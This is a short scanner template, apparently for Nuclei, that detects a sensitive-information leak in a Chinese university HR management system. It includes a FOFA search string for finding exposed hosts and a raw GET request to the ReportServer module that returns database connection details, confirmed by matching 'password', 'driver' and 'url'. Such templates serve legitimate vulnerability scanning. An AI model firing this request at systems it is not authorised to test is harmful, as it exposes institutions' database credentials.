id: university-hr-system-reportserver-info-leak

info:
  name: "高校人力资源管理系统 ReportServer 模块敏感信息泄露"
  author: 0dayPoc
  severity: medium
  description: |-
    fofa: body="FM_SYS_ID" || body="product/recruit/website/RecruitIndex.jsp"
          高校人力资源管理系统ReportServer模块配置不当导致敏感信息泄露
  tags: 高校人力资源管理系统,ReportServer

http:
- raw:
  - |
    GET /ReportServer?op=Fr_server&cmd=Sc_getconnectioninfo HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: gzip, deflate
    Accept: */*
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
      - 'password'
      - 'driver'
      - 'url'
    condition: and
